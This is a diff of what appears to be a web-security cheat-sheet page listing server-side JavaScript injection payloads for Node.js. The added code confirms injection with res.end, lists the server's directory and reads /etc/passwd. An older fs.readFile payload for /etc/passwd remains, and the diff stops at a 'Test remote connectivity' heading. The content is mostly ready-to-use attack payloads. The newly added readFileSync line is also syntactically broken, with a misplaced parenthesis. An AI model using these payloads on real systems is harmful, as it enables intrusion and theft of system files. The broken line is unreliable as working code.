@@ -49,16 +49,27 @@ Test for injection:
 {% highlight javascript %}
 0; res.json({"foo": "bar"});
 //look for json foo back
+
+res.end('test') 
+//res.end method terminates backend processing and sends contents to user
 {% endhighlight %}
 
-Read Files:
+Read Files and Directories:
 
 {% highlight javascript %}
+ //directories
+ res.end(require('fs').readdirSync('.').toString())
+
+//files
 0; var fs = require('fs'); fs.readFile('/etc/passwd', function(err, data) {
     res.writeHead(200, {'Content-Type': 'text/html'});
     res.write(data);
     res.end();
   });
+  
+  //files
+  res.end(require('fs'.readFileSync('/etc/passwd').toString())
+ 
 {% endhighlight %}
 
 Test remote connectivity:
